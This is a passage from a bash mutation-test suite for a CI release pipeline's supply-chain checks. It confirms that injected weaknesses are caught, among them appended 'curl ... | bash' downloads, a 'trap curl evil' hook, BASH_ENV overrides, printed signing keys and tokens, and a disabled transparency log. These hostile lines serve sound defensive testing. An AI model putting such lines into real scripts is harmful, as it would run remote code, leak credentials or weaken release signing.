  expect ok "AC11 the decide job (the CI patch tag, REQ-REL-009) may push its signed tag: it is not Release" "" graph "$work/g_decideok.yml"; fi
gm g_noif    '=    if: ${{ startsWith(github.ref, '\''refs/tags/v'\'') && !inputs.dry-run }}\n' ''                                                       'exactly the if'    "AC11 release carries no positive tag conjunct (a branch run would not be refused by its own if)"
gm g_gate    '  rebuild:\n    needs: \[build, sign\]'                  "  rebuild:\n    if: \${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}\n    needs: [build, sign]" 'no if' "AC11 the gate G on rebuild (only build, sign and sign-rebuild carry it)"
# ---- AC4: the order of bin/release-verify.sh ------------------------------------------------------------------------------------
vm() { if mutate "$work/verify.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" verify "$work/$1.sh"; fi; }
vm v_notag   '\[\[ "\$\{GITHUB_REF_NAME[^\n]*\n'            ''                                                       'commands'           "AC4 the tag check dropped"
vm v_wide    '\(-rc'                                         '(-beta'                                                 'not the pinned form' "AC4 the tag rule widened to another suffix"
vm v_nopol   'python3 bin/chain-verify.py policy make[^\n]*\n' ''                                                     'commands'           "AC4 the release policy is not made for the tag"
vm v_ref     '--tag "\$GITHUB_REF_NAME"'                     '--ref "$GITHUB_REF"'                                    'not the pinned form' "AC4 the policy made for a ref, not the tag"
vm v_nobuild 'python3 bin/chain-verify.py stage-start --stage release --previous build[^\n]*\n' ''                     'commands'           "AC4 Build's record is not verified"
vm v_nosign  'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n' ''                      'commands'           "AC4 Sign's provenance is not verified"
vm v_norbd   'python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n' ''                   'commands'           "AC4 Rebuild's record is not verified"
vm v_nochk   'python3 bin/chain-verify.py check-list[^\n]*\n' ''                     'commands'           "AC4 Check's record is not verified"
vm v_nogv    'python3 bin/chain-verify.py bind-check[^\n]*\n' ''                                                     'commands'           "G the govulncheck stream is not bound to Check's scanners record"
vm v_gvrec   'witness-check/witness-scanners/scanners-collection.json' 'witness-check/witness-runtime/runtime-collection.json' 'not the pinned form' "G the stream bound to another Check record than the scanners record"
vm v_gvfile  '--file check-results/govulncheck.json' '--file check-results/scan-results.json'                            'not the pinned form' "G bind-check names another file than govulncheck.json"
vm v_gvdig   '--digests witness-build/digests.json --file' '--file'                                                    'not the pinned form' "G the stream bound without Build's digest list"
vm v_gvfirst 'python3 bin/chain-verify.py check-list[^\n]*\n(python3 bin/chain-verify.py bind-check[^\n]*\n)' '\1python3 bin/chain-verify.py check-list --policy policy.json --digests witness-build/digests.json --dir witness-check\n' 'not the pinned form' "G the stream bound before Check's records are listed (rule 69's order)"
vm v_nobind  'python3 bin/chain-verify.py bind-items[^\n]*\n' ''                                                      'commands'           "AC16 items.json is not bound to Build's record"
vm v_noitems '--items witness-build/items.json'              ''                                                       'not the pinned form' "AC16 bind-items without the items file"
vm v_noadm   'python3 bin/chain-verify.py bind-items[^\n]*admission-baseline[^\n]*\n' ''                                    'commands'           "AC19 admission's baseline file is not bound to Build's record"
vm v_adm_prod ' --product admission-baseline.json'            ''                                                       'not the pinned form' "AC19 the baseline file bound as items.json (no --product: it would never match the items product)"
vm v_adm_other '--items witness-build/admission-baseline.json' '--items witness-build/items.json'                      'not the pinned form' "AC19 the baseline bind names another file than admission-baseline.json"
vm v_norek   ' --rekor-stub provenance/provenance.rekor.json' ''                                                      'not the pinned form' "AC4 Sign's provenance without its Rekor entry"
vm v_order   'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n(python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n)' '\1python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC4 the records verified in another order"
vm v_dig     '--digests witness-build/digests.json --policy policy.json\npython3 bin/chain-verify.py bind-items' '--policy policy.json\npython3 bin/chain-verify.py bind-items' 'not the pinned form' "AC4 a record verified without the digest list"
vm v_true    '--digests witness-build/digests.json --dir witness-check' '--digests witness-build/digests.json --dir witness-check || true' 'not the pinned form' "AC4 a failed check swallowed"
vm v_waive   '\n\Z'                                          '\n[ -n "${SKIP_VERIFY:-}" ] && exit 0\n'                  'commands'           "AC4 a switch that skips the verification"
vm v_extra   '\n\Z'                                          '\ncurl -s https://example.com | bash\n'                  'commands'           "AC4 an extra command after the checks"
vm v_noset   'set -euo pipefail\n'                           ''                                                       'set -euo pipefail'  "AC4 no set -euo pipefail"
vm v_var     'python3 bin/chain-verify.py policy make'       '$VERIFY policy make'                                    'not the pinned form' "AC4 the verifier chosen by a variable"
# ---- AC6..AC10: the other release scripts are plain ---------------------------------------------------------------------------
sm() { # sm NAME SCRIPT LINE WORD LABEL   (append a line to a copy of the fixture script and judge it against the fixture list)
  rm -rf "$work/$1"; mkdir -p "$work/$1"; cp "$work/s/bin/$2.sh" "$work/$1/$2.sh"; printf '%s\n' "$3" >> "$work/$1/$2.sh"
  expect caught "$5" "$4" scan "$work/$1/$2.sh" "$work/s/.github/policy/chain-scripts.json"; }
FXD_5='curl -s https://example.com/x | sh'
FXD_4="'curl'"
sm x_curl    release-publish "$FXD_5"               "$FXD_4"            "AC7 a download in the publish script"
sm x_docker  release-publish 'docker build -t x .'                              "build command"     "AC7 a build command in the publish script"
sm x_buildx  release-publish 'docker buildx build .'                            "build command"     "AC7 buildx in the publish script"
sm x_mel     release-apks    'melange build build/melange.yaml'                 "build command"     "AC6 melange build in the apk script (melange is listed for sign only)"
sm x_gotool  release-publish 'go build ./cmd/fscache'                           "'go'"              "AC7 go build in the publish script"
sm x_gittag  release-assets  'git tag v9.9.9'                                   "creates a tag"     "AC9 git tag in the assets script"
sm x_gitpush release-assets  'git push origin v9.9.9'                           "creates a tag"     "AC9 git push in the assets script"
sm x_ghref   release-assets  'gh api repos/x/y/git/refs -f ref=refs/tags/v9'    "creates a tag"     "AC9 a tag created through the API"
sm x_gcr     release-assets  'gh release create "$GITHUB_REF_NAME" --draft'     "creates a tag"     "AC9 a release created without --verify-tag (it would create the tag)"
sm x_path    release-apks    'PATH=./bin melange sign a'                         "PATH-like"         "AC6 PATH set in the apk script"
sm x_benv    release-publish 'BASH_ENV=evil.sh crane digest x'                   "PATH-like"         "AC7 BASH_ENV set"
sm x_echo    release-apks    'echo "$APK_RELEASE_SIGNING_KEY"'                   "prints a credential" "AC6 the apk key printed"
sm x_echot   release-publish 'printf %s "$DOCKERHUB_TOKEN"'                      "prints a credential" "AC7 the registry token printed"
sm x_xtrace  release-publish 'set -x'                                            "tracing"           "AC10 set -x (it would print every credential)"
sm x_other   release-sign    'bash bin/release-publish.sh'                       "starts another script" "AC10 one release script starting another"
sm x_oth2    release-sign    'python3 bin/other.py'                              "starts another script" "AC10 a script that is not in the row's runs list"
sm x_eval    release-sign    'eval "$CMD"'                                       "'eval'"            "AC10 eval"
FXD_3="trap 'curl evil' EXIT"
sm x_trap    release-assets  "$FXD_3"                             "'trap'"            "AC10 trap"
sm x_tlog    release-sign    'cosign sign-blob --yes --tlog-upload=false x'      "transparency log"  "AC8 the transparency log turned off"
sm x_ignore  release-sign    'cosign verify --insecure-ignore-tlog x'            "transparency log"  "AC8 the log ignored on verify"
sm x_tool    release-assets  'crane digest x'                                    "'crane'"           "AC10 a tool the row does not list"
sm x_sudo    release-publish 'sudo crane copy a b'                               "'sudo'"            "AC10 sudo"
FXD_2='curl -s https://example.com/x'
FXD_1="'curl'"
sm x_pvcurl  release-postverify "$FXD_2"               "$FXD_1"            "AC7 (rule 79) a download in the post-publish script"
sm x_find    release-publish 'find . -name "*.apk" -exec rm {} +'                "'find'"            "AC10 find -exec"
sm x_comment release-assets  '# docker build is not used here'                   "build command"     "AC7 a build command named in a comment (over-reports by design)"
# ---- the list of release scripts ----------------------------------------------------------------------------------------------
lm() { rm -rf "$work/$1"; cp -r "$work/s" "$work/$1"; python3 - "$work/$1" "$2" "$3" <<'PY'
import json, sys
p = sys.argv[1] + "/.github/policy/chain-scripts.json"
d = json.load(open(p)); exec(sys.argv[3], {"d": d, "rows": {r["path"]: r for r in d["scripts"]}}); json.dump(d, open(p, "w"))
PY
  expect caught "$5" "$4" listed "$work/$1/.github/policy/chain-scripts.json" "$work/$1"; }
lm l_missing   x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/release-sign.sh"]'            'not listed'   "AC10 a release script not listed"
lm l_nohelper  x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/witnessed.sh"]'               'not listed'   "AC10 the witnessed helper not listed"
lm l_tools     x 'rows["bin/release-publish.sh"]["tools"].append("docker")'                                  'exactly the tools' "AC10 a script lists a tool it should not"
lm l_tools2    x 'rows["bin/release-sign.sh"]["tools"].remove("jq")'                                         'exactly the tools' "AC10 a script lists fewer tools than it uses"
lm l_signs     x 'rows["bin/release-publish.sh"]["signs"] = "other"'                                         'signs:'       "AC10 the publish script listed as a signer"
lm l_signs2    x 'rows["bin/release-sign.sh"]["signs"] = False'                                              'signs:'       "AC10 the signing script listed as not signing"
lm l_reason    x 'rows["bin/release-apks.sh"]["reason"] = ""'                                                'reason'       "AC10 a signer without a reason"
lm l_runs      x 'rows["bin/release-verify.sh"]["runs"].append("bin/other.py")'                              'may start'    "AC10 a script allowed to start another one"
lm l_pvmiss    x 'd["scripts"] = [r for r in d["scripts"] if r["path"] != "bin/release-postverify.sh"]'     'not listed'   "AC10 (rule 79) the post-publish script not listed"
lm l_sha       x 'rows["bin/release-assets.sh"]["sha256"] = "0" * 64'                                        'sha256'       "AC10 a script changed after it was listed"
rm -rf "$work/l_gone"; cp -r "$work/s" "$work/l_gone"; rm "$work/l_gone/bin/release-assets.sh"
expect caught "AC10 a listed script that does not exist" "missing" listed "$work/l_gone/.github/policy/chain-scripts.json" "$work/l_gone"
# ---- AC12: the Witness record -------------------------------------------------------------------------------------------------
rec() { expect caught "$3" "$2" record "$work/$1.json" SENTINEL-VALUE-123; }
rec r_name "GH_TOKEN"                    "AC12 the job token variable named in the record (inside the base64 payload)"
rec r_dh   "DOCKERHUB_TOKEN"             "AC12 the registry token variable named in the record"
rec r_apk  "APK_RELEASE_SIGNING_KEY"     "AC12 the apk signing key variable named in the record"
rec r_idt  "ACTIONS_ID_TOKEN_REQUEST_URL" "AC12 the identity token request in the record"
rec r_rt   "ACTIONS_RUNTIME_TOKEN"       "AC12 the runtime token in the record"
rec r_val  "credential value"            "AC12 a credential value in the record"
rec r_jwt  "compact JWT"                 "AC12 a compact JWT in the record"
rec r_plain "DSSE envelope"              "AC12 a bare statement is not an envelope (it would hide the payload from a text search)"
rec r_garbage "DSSE envelope"            "AC12 a payload that is not a statement"
# ---- AC13: the old authorization machinery ----------------------------------------------------------------------------------
mkdir -p "$work/ra/bin" "$work/ra/.github/workflows"; : > "$work/ra/bin/authorize-acceptance-check.py"
expect caught "AC13 bin/authorize-acceptance-check.py still exists" "authorize-acceptance-check.py" removed "$work/ra"
mkdir -p "$work/rb/bin"; : > "$work/rb/bin/authorize-acceptance-check-test.sh"
expect caught "AC13 its test still exists" "authorize-acceptance-check-test.sh" removed "$work/rb"
mkdir -p "$work/rc/.github/workflows"; printf 'run: cosign verify-attestation --type release-authorization x\n' > "$work/rc/.github/workflows/stage-promote.yml"
expect caught "AC13 stage-promote.yml still reads the authorization predicate" "authorization predicate" removed "$work/rc"
mkdir -p "$work/rd/.github/workflows"; printf 'jobs:\n  authorization:\n    uses: ./.github/workflows/stage-authorize.yml\n' > "$work/rd/.github/workflows/release.yml"
expect caught "AC13 release.yml still has an authorization job" "authorization job" removed "$work/rd"
# ---- AC13: the metadata is made in order by bin/release-sign.sh (the VEX and CSAF before the manifest and the list, the manifest records their sha256, nothing signed earlier) ---------
expect ok "AC13 the real bin/release-sign.sh makes the metadata in order from Build's verified digests and items" "" metadata "$root/bin/release-sign.sh"
sg() { if mutate "$root/bin/release-sign.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" metadata "$work/$1.sh"; fi; }
sg m_novex   'python3 bin/vex-forms\.py [^\n]*\n'                                              ''                              'no vex step'        "AC13 the VEX and CSAF files are not generated"
sg m_noitems 'images --digests witness-build/digests.json --images-dir images --items witness-build/items.json' 'images --digests witness-build/digests.json --images-dir images' 'must carry --items' "AC13 the vex-forms input is not checked against Build's verified items"
sg m_nomitem 'manifest --digests witness-build/digests.json --images-dir images --items witness-build/items.json' 'manifest --digests witness-build/digests.json --images-dir images' 'must carry --items' "AC13 the manifest is not checked against Build's verified items"
sg m_novdir  ' --vex-dir release-metadata'                                                       ''                              'must carry --vex-dir' "AC13 the manifest does not record the VEX files' sha256"
sg m_nobase  'baseline=\$\(python3 bin/release-metadata\.py baseline [^\n]*\n'                              ''                              'no baseline step'   "AC19 the baseline is not read from Build's verified admission-baseline.json"
sg m_basetag 'baseline --admission witness-build/admission-baseline.json --tag "\$GITHUB_REF_NAME"'    'baseline --admission witness-build/admission-baseline.json --tag v0.3.0' 'must carry --tag' "AC19 the baseline check is not made for this run's tag"
sg m_ownbase ' --baseline-version "\$baseline"'                                                       ' --baseline-version "$GITHUB_REF_NAME"' 'must carry --baseline-version' "AC19 the manifest takes the tag's own name as the baseline (a CI patch tag has no such file)"
sg m_noatt   'for digest in "\$prod" "\$fips"; do\n  cosign attest [^\n]*\n  cosign attest [^\n]*\ndone\n'  ''                          'no attest step' "AH the release manifest is no longer attached to the public digests (the v0.2.x referrer customers have)"
sg m_atttype 'attestations/release-manifest/v1 "ghcr'  'attestations/release-manifest/v2 "ghcr'                         'exactly these two' "AH the referrer type is not release-manifest/v1"
sg m_attpred 'release-metadata/release-manifest.json --type' 'release-metadata/vex-images.json --type'            'exactly these two' "AH the attested predicate is not the verified manifest"
sg m_attghcr ' "ghcr.io/\$repo@\$digest"' ' "ghcr.io/$repo@$digest" || true'                                    'exactly these two' "AH the GHCR referrer is best-effort (it is required)"
sg m_attnohub 'cosign attest [^\n]*docker.io[^\n]*\n' ''                                                         'exactly these two' "AH the Docker Hub mirror referrer is missing"
sg m_attearly '(for host in ghcr.io docker.io; do\n  for digest in "\$prod" "\$fips"; do\n    cosign sign --yes[^\n]*\n  done\ndone\n)((?:#[^\n]*\n)*for digest in[^\n]*\n  cosign attest[^\n]*\n  cosign attest[^\n]*\ndone\n)' '\2\1' 'must come after every image signature' "AH the manifest attestations before the image signatures"
sg m_nolist  'python3 bin/release-metadata\.py list [^\n]*\n'                                   ''                              'no list step'       "AC13 release-files.sha256 is not made"
sg m_early   '(python3 bin/release-metadata\.py images [^\n]*\n)'                              'cosign login ghcr.io -u x --password-stdin <<< "$GH_TOKEN"\n\1' 'must come before' "AC13 a registry login (the first cosign call) before the metadata exists"
python3 - "$root/bin/release-sign.sh" "$work/m_swap.sh" <<'PY'
import sys
L = open(sys.argv[1]).read().split("\n")
a = next(i for i, l in enumerate(L) if "release-metadata.py manifest" in l); b = next(i for i, l in enumerate(L) if "bin/vex-forms.py" in l)
L[a], L[b] = L[b], L[a]
open(sys.argv[2], "w").write("\n".join(L))
PY
expect caught "AC13 the manifest is made before the VEX and CSAF files exist" "must come before" metadata "$work/m_swap.sh"
# ---- the real repository (RED until PR 4 is implemented) ---------------------------------------------------------------------
expect ok "the real stage-promote.yml is the Release stage" "" stage "$root/.github/workflows/stage-promote.yml"
expect ok "the real credentials reach only the steps that need them" "" credentials "$root/.github/workflows/stage-promote.yml"
expect ok "nothing outside the release job holds packages write or a credential" "" others "$root"
expect ok "the real release.yml: the release job needs exactly check, sign and sign-rebuild, no skip, no tag" "" graph "$root/.github/workflows/release.yml"
expect ok "the real bin/release-verify.sh verifies in rule 69's order" "" verify "$root/bin/release-verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets release-postverify; do
  expect ok "the real bin/$n.sh is plain" "" scan "$root/bin/$n.sh" "$root/.github/policy/chain-scripts.json"
done
expect ok "the real release scripts are listed in chain-scripts.json" "" listed "$root/.github/policy/chain-scripts.json" "$root"
expect ok "the old authorization machinery is gone from the real repository" "" removed "$root"
# round 1 (Codex PR 415): the requirement text and the stage file's header say only what is enforced about credentials (no job holds a write token or a secret before an earlier job verified; no explicit credential binding up to release-verify)
python3 - "$root/requirements/requirements.yaml" <<'PY' && ok "text: REQ-CHAIN-007-AC1 does not claim that no credential exists before the melange install, and states the explicit bindings and the verify gate" || bad "text: REQ-CHAIN-007-AC1 overstates credential absence"
import sys, yaml
t = next(a for q in yaml.safe_load(open(sys.argv[1]))["requirements"] if q["id"] == "REQ-CHAIN-007" for a in q["acceptance_criteria"] if a["id"] == "REQ-CHAIN-007-AC1")["then"]
assert "before any credential exists" not in t and "no explicit credential binding" in t and "needs: verify" in t, t[:200]
PY
python3 - "$root/.github/workflows/stage-promote.yml" "$root/bin/release-verify.sh" <<'PY' && ok "text: the stage-promote.yml header and release-verify.sh do not say that no credential exists before release-verify" || bad "text: a header comment overstates credential absence"
import sys
for f in sys.argv[1:]:
    t = open(f).read()
    assert "no credential exists yet" not in t and "No credential exists in this step" not in t, f
PY
python3 - "$root/requirements/requirements.yaml" "$root/.github/policy/chain-scripts.json" "$root/.github/workflows/stage-promote.yml" <<'PY' && ok "text: the REQ-CHAIN-007 statement, the release-verify row reason and the stage header make no blanket claim that no credential exists" || bad "text: a statement, reason or header still overstates credential absence"
import json, sys, yaml
q = next(q for q in yaml.safe_load(open(sys.argv[1]))["requirements"] if q["id"] == "REQ-CHAIN-007")
assert "before any credential exists" not in q["statement"], "statement"
assert "explicitly binds a credential" in q["statement"], "statement says explicitly"
row = next(r for r in json.load(open(sys.argv[2]))["scripts"] if r["path"] == "bin/release-verify.sh")
assert "no credential exists" not in row["reason"], "row reason"
h = open(sys.argv[3]).read().split("\nname:")[0]
assert "it holds them only in the Witness steps that need them" not in h and "so no credential or key is read" not in h, "header"
PY
EXPECT=291
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
